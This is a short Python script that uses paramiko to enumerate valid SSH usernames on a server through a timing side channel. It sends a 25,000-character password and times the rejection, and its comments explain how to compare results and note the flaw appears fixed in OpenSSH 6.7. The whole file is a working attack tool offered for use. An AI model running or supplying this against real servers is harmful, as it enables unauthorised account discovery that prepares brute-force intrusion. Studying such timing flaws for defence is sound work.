#!/usr/bin/python3
# Validate usernames on a system via SSH
# A valid username will take longer to check credentials than an invalid one
#	Run this twice on an SSH server you know a username exists for:
#		Once with the valid username & once with an invalid username
#		Check the difference in time
# Note: This seems to be fixed with OpenSSh v6.7 (maybe older)

import paramiko
import time

server = input("Server: ")
prt = input("Port: ")
usr = input("Username: ")
p = 'A' * 25000
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
starttime = time.time()
try:
  ssh.connect(server, port = prt, username = usr, password = p)
except:
	endtime = time.time()

total = endtime - starttime
print(total)
